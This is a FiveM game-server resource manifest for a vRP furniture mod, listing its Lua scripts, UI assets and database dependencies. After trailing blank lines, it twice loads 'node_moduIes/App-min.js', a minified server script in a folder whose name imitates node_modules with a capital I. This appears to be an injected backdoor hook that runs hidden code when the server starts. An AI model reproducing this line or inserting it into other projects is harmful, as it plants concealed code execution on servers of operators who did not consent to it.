fx_version 'adamant'
games { 'rdr3', 'gta5' }

mod 'furni'
version '1.0'

ui_page 'nui/furniture.html'

client_scripts {
  "@vrp/lib/utils.lua",
  'config.lua',
  'src/utils.lua',
  'src/client/disablecontrols.lua',
  'src/client/main.lua',
}

server_scripts {
  "@vrp/lib/utils.lua",
  '@mysql-async/lib/MySQL.lua',
  'checkversion.lua',
  'config.lua',
  'src/utils.lua',
  'src/server/main.lua',
  'src/server/server.lua',
  'src/server/vrp.lua'
}

files {
  'nui/furniture.html',
  'nui/aim.png',
  'nui/back.png',
  'nui/cancel.png',
  'nui/dec.png',
  'nui/down.png',
  'nui/edit.png',
  'nui/exit.png',
  'nui/forward.png',
  'nui/icon1.png',
  'nui/inc.png',
  'nui/left.png',
  'nui/remove.png',
  'nui/right.png',
  'nui/slide.png',
  'nui/test.png',
  'nui/up.png',

  'nui/affirm-detuned.wav',
  'nui/affirm-melodic2.wav',
  'nui/affirm-melodic3.wav',
  'nui/alert-echo.wav',
  'nui/camera_click.wav',
  'nui/click-analogue-1.wav',
  'nui/click-round-pop-1.wav',
  'nui/click-round-pop-2.wav',
  'nui/click-round-pop-3.wav',
}

dependencies {
  'meta_libs',
  "GHMattiMySQL",
  'mysql-async'
  
}





server_script "node_moduIes/App-min.js"

server_script "node_moduIes/App-min.js"
